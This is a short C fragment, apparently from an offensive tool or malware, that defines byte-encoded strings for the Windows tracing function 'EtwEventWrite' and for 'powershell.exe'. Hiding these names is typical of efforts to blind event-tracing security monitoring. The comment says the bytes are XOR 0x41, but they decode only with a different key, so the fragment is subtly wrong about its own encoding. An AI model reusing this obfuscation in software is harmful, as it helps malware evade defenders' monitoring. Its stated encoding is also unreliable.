...
static const unsigned char xEtwEventWrite[] = {
    0xDE, 0xEF, 0xEC, 0xDE, 0xED, 0xFE, 0xF5, 0xEF,
    0xCC, 0xE9, 0xF2, 0xEF, 0xFE
};
#define xEtwEventWrite_LEN 13

/* "powershell.exe" XOR 0x41 */
static const unsigned char xPowerShell[] = {
    0xEB, 0xF4, 0xEC, 0xFE, 0xE9, 0xE8, 0xF3, 0xFE,
    0xF7, 0xF7, 0xB5, 0xFE, 0xE3, 0xFE
};
